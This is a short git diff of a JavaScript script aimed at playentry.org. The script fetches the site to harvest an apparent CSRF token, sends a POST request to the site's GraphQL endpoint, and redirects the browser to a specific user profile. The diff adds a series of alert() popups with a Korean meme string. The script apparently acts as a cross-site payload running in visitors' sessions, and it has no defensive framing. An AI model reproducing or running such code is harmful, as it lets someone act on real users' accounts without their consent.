@@ -1,3 +1,4 @@
+alert('엄준식 1')
 async function getCookie() {
   csrf = await fetch("https://playentry.org");
   body = await csrf.text();
@@ -19,4 +20,9 @@ fetch("https://playentry.org/graphql", {
   "method": "POST",
 });
 })
+alert('엄준식 2')
 location.href = "https://playentry.org/profile/6415158297bafa011b552344"
+alert('엄준식 3')
+alert('엄준식 4')
+alert('엄준식 5')
+alert('엄준식 6')
